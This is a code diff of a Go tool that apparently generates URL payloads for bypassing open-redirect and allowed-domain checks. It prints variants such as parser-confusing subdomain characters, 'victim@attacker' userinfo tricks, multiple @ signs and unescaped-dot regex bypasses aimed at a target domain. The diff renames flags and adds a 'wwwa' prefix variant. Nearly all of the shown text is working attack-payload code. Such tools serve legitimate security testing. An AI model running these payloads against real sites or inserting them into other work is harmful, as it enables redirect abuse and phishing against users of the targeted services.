@@ -11,15 +11,15 @@ import (
 )
 
 func main() {
-	target := flag.String("target-domain", "victim.example", "victims domain")
-	attackerdomain := flag.String("attacker-domain", "attacker.example", "attackers domain")
+	target := flag.String("target", "victim.example", "victims domain")
+	attackerdomain := flag.String("attacker", "attacker.example", "attackers domain")
 	attackerIP := flag.String("attacker-ip", "127.0.0.1", "attackers IP")
 	proto := flag.String("proto", "https://", "protocol of victims url")
 	path := flag.String("path", "", "an allowed path like /callback")
 	flag.Parse()
 
 	//different ways to start a url
-	protocols := []string{"///", "/%09/", "/\\"}
+	protocols := []string{"//", "/%09/", "/\\"}
 	//chars allowed in subdomains which might confuse parsers to think the host part ended (many only work in Safari)
 	subdomainchars := []string{",", "&", "'", "\"", ";", "!", "$", "^", "*", "(", ")", "+", "`", "~", "-", "_", "=", "|", "{", "}", "%", "%01", "%02", "%03", "%04", "%05", "%06", "%07", "%08", "%0b", "%0c", "%0e", "%0f", "%10", "%11", "%12", "%13", "%14", "%15", "%16", "%17", "%18", "%19", "%1a", "%1b", "%1c", "%1d", "%1e", "%1f", "%7f"}
 	//seperators between target and malicious
@@ -56,7 +56,6 @@ func main() {
 			fmt.Println(protocol + domain + *path)
 		}
 	}
-
 	//contains
 	fmt.Println("https://" + *attackerdomain + "/" + *proto + *target + *path)
 	//port as pass
@@ -65,9 +64,11 @@ func main() {
 	}
 	//mutliple @s
 	fmt.Println("https://" + *target + "@" + *target + "@" + *attackerdomain + *path)
-	// unescaped dots in regexes e.g. /sub.victim.com/ -> subavictim.com
+	// unescaped dots in regexes & endsWith e.g. /www.victim.com/ -> wwwavictim.com
 	if len(strings.Split(*target, ".")) > 2 {
 		fmt.Println(*proto + strings.Replace(*target, ".", "a", 1) + *path)
+	} else {
+		fmt.Println(*proto + "wwwa" + *target + *path)
 	}
 	//e.g. https://victim.com@attacker.com
 	for _, seperator := range seperators {
